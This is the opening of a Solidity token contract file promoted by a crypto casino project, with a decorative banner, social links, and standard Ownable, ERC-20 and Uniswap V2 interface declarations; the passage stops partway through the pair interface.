
// File: crypt.sol
//SPDX-License-Identifier: MIT

/*



                ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
                ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù
                ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë
                ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñë‚ñë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñë‚ñë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë
                ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë
                ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë
                
    
        
TELEGRAM: https://t.me/betcryptETH
Website: https://betcrypt.casino
Twitter: https://twitter.com/betcrypteth

‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£§‚£¥‚°Ü‚¢§‚£§‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£ø‚°π‚†á‚†Ä‚¢∏‚£¶‚†ô‚¢∑‚£Ü‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚°æ‚†∑‚£ø‚£¶‚†Ñ‚†Ä‚†Ä‚†ø‚†∂‚†∂‚†ø‚†∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚¢æ‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£Ω‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚¢∏‚°ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ñ‚†ê‚¢§‚£ò‚¢ß‚°ò‚¢∑‚£ø‚£Ü‚¢∑‚£º‚°á‚£ø‚£ø‚°è‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ü‚£ø‚£ø‚°ø‚£ü‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£¥‚£ø‚£∑‚°Ñ
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†°‚†Ä‚†ô‚¢¶‚£â‚†ª‚£ø‚£¶‚°ª‚£ø‚°û‚¢ø‚°á‚£ø‚°ü‚£º‚£ø‚£ø‚£ø‚°ø‚£ü‚£Ω‚£æ‚£ø‚°∑‚¢ø‚£õ‚£Ω‚£∑‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚£ø‚†ø‚†É
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†¢‚†Ä‚¢à‚†ô‚†∑‚¢¶‚£ù‚†∑‚£º‚£ø‚£º‚°á‚£ª‚£ø‚£ø‚£ø‚£ü‚£ø‚°æ‚¢ü‚£õ‚£≠‚£∑‚£æ‚£ø‚£ø‚†ø‚†ø‚°ø‚£ü‚¢õ‚¢ª‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚°ø‚†Ä‚†Ä
‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢®‚°Ä‚£á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°à‚†Å‚†í‚†¨‚†ø‚¢ø‚£•‚£∞‚£æ‚£ø‚¢Ä‚£º‚†ø‚†Ø‚†∑‚†ö‚¢õ‚£ª‚£≠‚£≠‚£¥‚£∂‚£∂‚£ø‚£ø‚£ø‚£≠‚£¨‚£Ω‚£ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚°á‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°Ü‚£ø‚£Ñ‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£∫‚£ø‚£ã‚£©‚£Ö‚£π‚£ß‚£à‚£®‚£≠‚£≠‚£≠‚£≠‚£≠‚£≠‚£§‚£≠‚£•‚£¨‚£≠‚£§‚£¨‚£≠‚£Ω‚£è‚°¥‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚†Å‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°û‚£ø‚£ø‚£∑‚£©‚£≠‚£≠‚£ø‚£ø‚£Ω‚£≠‚£ç‚°≠‚¢â‚¢â‚†â‚°â‚†â‚†â‚†â‚†â‚†â‚†â‚†â‚†â‚†â‚†ô‚†õ‚†ª‚†ü‚†ü‚†õ‚†õ‚†õ‚†ü‚†ü‚†ª‚†õ‚†ô‚†â‚†ã‚†ª‚¢ô‚†ã‚†â‚†â‚†â‚†â‚†ë‚°Ü‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°è‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚£∂‚£∂‚£∑‚£æ‚£∂‚£∂‚£∑‚£∂‚£æ‚£ø‚£∑‚£∑‚£∂‚£æ‚£∂‚£∂‚£∂‚£æ‚£∂‚£∂‚£∂‚£∂‚£∂‚£∂‚£∂‚£∑‚£æ‚£∂‚£∂‚£∂‚£∑‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚£Ä‚£†‚£Ñ‚£†‚£Ä‚£ò‚°Ä‚†Ä‚†Ä‚¢õ‚£º‚£§‚£¶‚£Ñ‚£õ‚£ö‚°≥‚°Ñ‚†õ‚£∑‚£º‚£¶‚£§‚£§‚£∏‚£∂‚¢¶‚£•‚†ê‚£†‚£§‚£§‚£Ä‚£Ä‚£Ä‚°Ä‚††‚£Ω‚£ø‚£ø‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚¢ø‚£ø‚£ø‚£ø‚°ü‚°û‚†â‚†â‚†â‚†â‚†â‚†â‚°ª‚°Ü‚¢∏‚°è‚†â‚†â‚†â‚†â‚†â‚†ô‚£ø‚£å‚¢∫‚°ø‚†â‚†â‚†â‚†â‚†â‚†ô‚£∑‚°à‚¢∫‚†ã‚†â‚†â‚†â‚†â‚†â‚°ô‚£á‚¢∏‚£ø‚£ø‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚¢®‚¢æ‚£ø‚£ø‚°á‚°á‚†Ä‚£¶‚£Ä‚£Ä‚£Ä‚£†‚°á‚°á‚†Ä‚°á‚¢Ä‚£Ñ‚£Ä‚£Ä‚£Ä‚°Ä‚£ø‚£Ø‚¢π‚°ó‚¢†‚£Ñ‚£Ä‚£Ä‚£Ä‚°Ä‚£ø‚†à‚¢∏‚†Ä‚¢†‚£Ä‚£Ä‚£Ä‚£Ä‚†Ü‚£ß‚¢∏‚£ø‚£ø‚†Ä‚†Ä‚£∑‚£Ä‚°Ä‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ß‚†ò‚¢∏‚£ø‚£ø‚°á‚°á‚†∏‚°ø‚†ü‚†ø‚£ø‚†è‚°è‚°á‚†Ä‚°á‚¢∏‚°ø‚†õ‚†ø‚£ø‚†É‚£ø‚°è‚¢∏‚°á‚¢ª‚†ø‚†õ‚¢ø‚°ø‚†â‚¢ª‚°Ä‚¢∏‚†Ä‚¢ø‚†ø‚†õ‚£ø‚°ø‚†Ä‚£ø‚¢∏‚£ø‚£ø‚†Ä‚†Ä‚¢∫‚£ø‚°á‚£ø‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚¢†‚¢º‚£ø‚£ø‚°á‚°á‚†Ä‚†Ä‚¢Ä‚£º‚°ø‚†Ä‚†Ñ‚£á‚†Ä‚°á‚†Ä‚†Ä‚¢Ä‚£º‚°á‚†Ä‚¢∏‚°á‚¢∏‚†É‚†Ä‚†Ä‚¢†‚£æ‚†á‚†Ä‚¢∏‚°á‚£∏‚†Ä‚†Ä‚†Ä‚£†‚£ø‚†Å‚†Ä‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†å‚†à‚£ø‚£ø‚°Ü‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚¢∏‚£ª‚£ø‚£ø‚°á‚°á‚†Ä‚†Ä‚†∏‚£ø‚†Å‚†Ä‚†Ä‚£ø‚¢Ä‚°á‚†Ä‚†Ä‚¢æ‚°ø‚†°‚†Ä‚¢∏‚°á‚¢∏‚†Ä‚†Ä‚†∞‚£ø‚°è‚†Ä‚¢Ä‚£∏‚°è‚¢Ω‚†Ä‚†Ä‚†∞‚£ø‚†è‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∞‚°Ü‚†Ä‚¢ª‚°ü‚£ø‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚¢∏‚¢ª‚£ø‚£ø‚°ø‚£ß‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°ü‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚†á‚¢∫‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∏‚°á‚†Ä‚£º‚£∑‚£ø‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°ø‚¢∏‚¢∏‚£ø‚£ø‚°á‚†ª‚†ø‚†ì‚†í‚†ö‚†õ‚†õ‚†õ‚†Å‚†à‚†ª‚†∑‚†ö‚†í‚†í‚†õ‚†õ‚†õ‚†Å‚†à‚†ª‚†ñ‚†í‚†í‚†õ‚†õ‚†õ‚†õ‚†Ä‚†ò‚†≥‚†ü‚†í‚†í‚†ö‚†õ‚†õ‚†ã‚£º‚£ø‚£ø‚†Ä‚¢∏‚¢ª‚£∞‚°ø‚†ü‚†ã‚†Ä‚†Ä
‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£∏‚¢∏‚£ø‚£ø‚£ß‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä üé∞‚ô¶‚ô†‚ô•Ô∏è‚ô£üé≤üí∏üÉè‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚†Ä‚†Ä
‚°É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£ø‚£ø‚£ø‚£ø‚°ü‚£ü‚¢õ‚£õ‚£õ‚°õ‚£ø‚£ø‚¢ø‚£ø‚°ø‚£ø‚£ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚£ü‚¢ø‚†ª‚†ø‚†ü‚¢ø‚£ø‚£ø‚††‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£ø‚£ø‚£ø‚£ü‚£ø‚¢∂‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚£ø‚£ø‚£ø‚£ø‚£ø‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚††‚£ø‚£ª‚¢ª‚£ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚¢ø‚†ø‚°ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚°ø‚†Ä‚£∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚£ø‚£ø‚£ø‚£∂‚£§‚£§‚£§‚¢Ñ‚¢§‚°§‚°∞‚†Ü‚†•‚†≤‚†Ç‚†î‚†∞‚¢†‚£ª‚£û‚¢ñ‚¢≤‚°ª‚°ö‚°ü‚¢ü‚¢õ‚£õ‚°ü‚£ü‚¢ø‚£ª‚£õ‚£ü‚£ø‚£ª‚°ª‚°õ‚°í‚¢í‚¢∞‚¢¢‚°ø‚£ø‚£ª‚¢≥‚£æ‚£ø‚°∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ó‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚¢ø‚£ø‚°ø‚†ø‚†ø‚†ø‚†ø‚†ø‚¢ø‚£ø‚°ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚£ø‚£ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚¢ø‚£ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚¢ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚°Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚†ê‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚°ó‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∞‚£ø‚°ß‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∞‚¢ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†É‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†à‚†ô‚†ã‚†Ä


*/

pragma solidity = 0.8.20;
pragma experimental ABIEncoderV2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);

    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

